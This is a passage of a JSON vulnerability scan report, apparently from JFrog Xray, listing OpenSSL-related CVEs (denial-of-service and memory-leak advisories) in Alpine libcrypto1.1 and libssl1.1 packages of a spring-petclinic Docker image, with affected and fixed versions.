         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-4603",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-601459",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long DSA keys or parameters may be very\nslow.\n\nImpact summary: Applications that use the functions EVP_PKEY_param_check()\nor EVP_PKEY_public_check() to check a DSA public key or DSA parameters may\nexperience long delays. Where the key or parameters that are being checked\nhave been obtained from an untrusted source this may lead to a Denial of\nService.\n\nThe functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform\nvarious checks on DSA parameters. Some of those computations take a long time\nif the modulus (`p` parameter) is too large.\n\nTrying to use a very large modulus is slow and OpenSSL will not allow using\npublic keys with a modulus which is over 10,000 bits in length for signature\nverification. However the key and parameter check functions do not limit\nthe modulus size when performing the checks.\n\nAn application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check()\nand supplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nThese functions are not called by OpenSSL itself on untrusted DSA keys so\nonly applications that directly call these functions may be vulnerable.\n\nAlso vulnerable are the OpenSSL pkey and pkeyparam command line applications\nwhen using the `-check` option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.0-r2"
            ],
            "fixed_versions": [
               "3.3.0-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-4603"
                  }
               ],
               "description": "Issue summary: Checking excessively long DSA keys or parameters may be very\nslow.\n\nImpact summary: Applications that use the functions EVP_PKEY_param_check()\nor EVP_PKEY_public_check() to check a DSA public key or DSA parameters may\nexperience long delays. Where the key or parameters that are being checked\nhave been obtained from an untrusted source this may lead to a Denial of\nService.\n\nThe functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform\nvarious checks on DSA parameters. Some of those computations take a long time\nif the modulus (`p` parameter) is too large.\n\nTrying to use a very large modulus is slow and OpenSSL will not allow using\npublic keys with a modulus which is over 10,000 bits in length for signature\nverification. However the key and parameter check functions do not limit\nthe modulus size when performing the checks.\n\nAn application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check()\nand supplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nThese functions are not called by OpenSSL itself on untrusted DSA keys so\nonly applications that directly call these functions may be vulnerable.\n\nAlso vulnerable are the OpenSSL pkey and pkeyparam command line applications\nwhen using the `-check` option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-4603",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-599310",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long invalid RSA public keys may take\na long time.\n\nImpact summary: Applications that use the function EVP_PKEY_public_check()\nto check RSA public keys may experience long delays. Where the key that\nis being checked has been obtained from an untrusted source this may lead\nto a Denial of Service.\n\nWhen function EVP_PKEY_public_check() is called on RSA public keys,\na computation is done to confirm that the RSA modulus, n, is composite.\nFor valid RSA keys, n is a product of two or more large primes and this\ncomputation completes quickly. However, if n is an overly large prime,\nthen this computation would take a long time.\n\nAn application that calls EVP_PKEY_public_check() and supplies an RSA key\nobtained from an untrusted source could be vulnerable to a Denial of Service\nattack.\n\nThe function EVP_PKEY_public_check() is not called from other OpenSSL\nfunctions however it is called from the OpenSSL pkey command line\napplication. For that reason that application is also vulnerable if used\nwith the '-pubin' and '-check' options on untrusted data.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.4-r4"
            ],
            "fixed_versions": [
               "3.1.4-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-6237"
                  }
               ],
               "description": "Issue summary: Checking excessively long invalid RSA public keys may take\na long time.\n\nImpact summary: Applications that use the function EVP_PKEY_public_check()\nto check RSA public keys may experience long delays. Where the key that\nis being checked has been obtained from an untrusted source this may lead\nto a Denial of Service.\n\nWhen function EVP_PKEY_public_check() is called on RSA public keys,\na computation is done to confirm that the RSA modulus, n, is composite.\nFor valid RSA keys, n is a product of two or more large primes and this\ncomputation completes quickly. However, if n is an overly large prime,\nthen this computation would take a long time.\n\nAn application that calls EVP_PKEY_public_check() and supplies an RSA key\nobtained from an untrusted source could be vulnerable to a Denial of Service\nattack.\n\nThe function EVP_PKEY_public_check() is not called from other OpenSSL\nfunctions however it is called from the OpenSSL pkey command line\napplication. For that reason that application is also vulnerable if used\nwith the '-pubin' and '-check' options on untrusted data.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-6237",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-599310",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long invalid RSA public keys may take\na long time.\n\nImpact summary: Applications that use the function EVP_PKEY_public_check()\nto check RSA public keys may experience long delays. Where the key that\nis being checked has been obtained from an untrusted source this may lead\nto a Denial of Service.\n\nWhen function EVP_PKEY_public_check() is called on RSA public keys,\na computation is done to confirm that the RSA modulus, n, is composite.\nFor valid RSA keys, n is a product of two or more large primes and this\ncomputation completes quickly. However, if n is an overly large prime,\nthen this computation would take a long time.\n\nAn application that calls EVP_PKEY_public_check() and supplies an RSA key\nobtained from an untrusted source could be vulnerable to a Denial of Service\nattack.\n\nThe function EVP_PKEY_public_check() is not called from other OpenSSL\nfunctions however it is called from the OpenSSL pkey command line\napplication. For that reason that application is also vulnerable if used\nwith the '-pubin' and '-check' options on untrusted data.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.4-r4"
            ],
            "fixed_versions": [
               "3.1.4-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-6237"
                  }
               ],
               "description": "Issue summary: Checking excessively long invalid RSA public keys may take\na long time.\n\nImpact summary: Applications that use the function EVP_PKEY_public_check()\nto check RSA public keys may experience long delays. Where the key that\nis being checked has been obtained from an untrusted source this may lead\nto a Denial of Service.\n\nWhen function EVP_PKEY_public_check() is called on RSA public keys,\na computation is done to confirm that the RSA modulus, n, is composite.\nFor valid RSA keys, n is a product of two or more large primes and this\ncomputation completes quickly. However, if n is an overly large prime,\nthen this computation would take a long time.\n\nAn application that calls EVP_PKEY_public_check() and supplies an RSA key\nobtained from an untrusted source could be vulnerable to a Denial of Service\nattack.\n\nThe function EVP_PKEY_public_check() is not called from other OpenSSL\nfunctions however it is called from the OpenSSL pkey command line\napplication. For that reason that application is also vulnerable if used\nwith the '-pubin' and '-check' options on untrusted data.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-6237",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-597665",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.2.1-r2"
            ],
            "fixed_versions": [
               "3.2.1-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2511"
                  }
               ],
               "description": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-2511",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-597665",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.2.1-r2"
            ],
            "fixed_versions": [
               "3.2.1-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2511"
                  }
               ],
               "description": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-2511",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-594380",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "A memory leak flaw was found in Golang in the RSA encrypting/decrypting code, which might lead to a resource exhaustion vulnerability using attacker-controlled inputs​. The memory leak happens in github.com/golang-fips/openssl/openssl/rsa.go#L113. The objects leaked are pkey​ and ctx​. That function uses named return parameters to free pkey​ and ctx​ if there is an error initializing the context or setting the different properties. All return statements related to error cases follow the \"return nil, nil, fail(...)\" pattern, meaning that pkey​ and ctx​ will be nil inside the deferred function that should free them.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-1394"
                  }
               ],
               "description": "A memory leak flaw was found in Golang in the RSA encrypting/decrypting code, which might lead to a resource exhaustion vulnerability using attacker-controlled inputs​. The memory leak happens in github.com/golang-fips/openssl/openssl/rsa.go#L113. The objects leaked are pkey​ and ctx​. That function uses named return parameters to free pkey​ and ctx​ if there is an error initializing the context or setting the different properties. All return statements related to error cases follow the \"return nil, nil, fail(...)\" pattern, meaning that pkey​ and ctx​ will be nil inside the deferred function that should free them.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-1394",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-594380",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "A memory leak flaw was found in Golang in the RSA encrypting/decrypting code, which might lead to a resource exhaustion vulnerability using attacker-controlled inputs​. The memory leak happens in github.com/golang-fips/openssl/openssl/rsa.go#L113. The objects leaked are pkey​ and ctx​. That function uses named return parameters to free pkey​ and ctx​ if there is an error initializing the context or setting the different properties. All return statements related to error cases follow the \"return nil, nil, fail(...)\" pattern, meaning that pkey​ and ctx​ will be nil inside the deferred function that should free them.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-1394"
                  }
               ],
               "description": "A memory leak flaw was found in Golang in the RSA encrypting/decrypting code, which might lead to a resource exhaustion vulnerability using attacker-controlled inputs​. The memory leak happens in github.com/golang-fips/openssl/openssl/rsa.go#L113. The objects leaked are pkey​ and ctx​. That function uses named return parameters to free pkey​ and ctx​ if there is an error initializing the context or setting the different properties. All return statements related to error cases follow the \"return nil, nil, fail(...)\" pattern, meaning that pkey​ and ctx​ will be nil inside the deferred function that should free them.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-1394",
            "result": "not_covered"
         }
      }
   ]
}
